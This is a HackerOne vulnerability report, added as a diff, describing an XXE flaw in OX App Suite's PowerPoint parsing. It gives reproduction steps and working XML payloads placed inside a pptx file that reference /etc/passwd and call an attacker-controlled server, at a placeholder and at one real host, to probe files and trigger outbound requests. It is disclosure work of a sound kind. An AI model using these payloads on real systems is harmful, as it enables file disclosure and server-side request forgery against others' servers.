@@ -1,0 +1,60 @@
+ReportLink:https://hackerone.com/reports/334488
+WeaknessName:XML External Entities (XXE)
+Reporter:https://hackerone.com/mishre
+ReportedTo:OX App Suite(appsuite)
+BountyAmount:2000.0
+Severity:critical
+State:Closed
+DateOfDisclosure:23.07.2018 9:50:02
+
+Summary:
+
+## Summary
+During the parsing of Powerpoint files it seems that it is possible to include XXE payload which will be executed on the Open-XChange server. I was able to identify which files exist on the server, and cause the server make arbitrary request to my own server, and I am pretty sure it is also possible to read arbitrary files from the server as described here: 
+http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html.
+
+ I'll try to follow up with a full poc for reading files later today/tomorrow.
+
+## Steps to Reproduce
+1. Create a powerpoint slide.
+2. Open the created file using winrar (a pptx file is actually an archive).
+3. Extract the tableStyles.xml file which is located in the ppt folder and open it in your favorite editor. It should look something like this:
+
+```
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<a:tblStyleLst xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" def="{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}"/>
+```
+Now, setup a server where you can view incoming connections and save the file to look like this:
+
+```
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY sp SYSTEM "https://{your-address}/">]><r>&sp;</r>
+<a:tblStyleLst xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" def="{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}"/>
+```
+
+4. Put the updated file back into the pptx by dragging it to the ppt folder.
+5. Upload the file to Open-XChange and open it up. 
+6. Check your server logs and see that a request from the user agent: Java/1.8.0_131 was sent.
+
+
+## Payload to view if a file exists on the server
+
+```
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd"><!ENTITY sp SYSTEM "https://{your-server}/">]><r>&xxe;&sp;</r>
+<a:tblStyleLst xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" def="{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}"/>
+```
+
+If you receive a request to the server this means the file exists. For example this payload:
+
+```
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY xxe SYSTEM "file:///etc/passwdafasdfqwe"><!ENTITY sp SYSTEM "https://recorder.run.aws-usw02-pr.ice.predix.io/">]><r>&xxe;&sp;</r>
+<a:tblStyleLst xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" def="{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}"/>
+```
+
+will not generate an http request to your server.
+
+## Impact
+
+An attacker can extract different data from the server (possibly read local files), and make arbitrary request to any server.
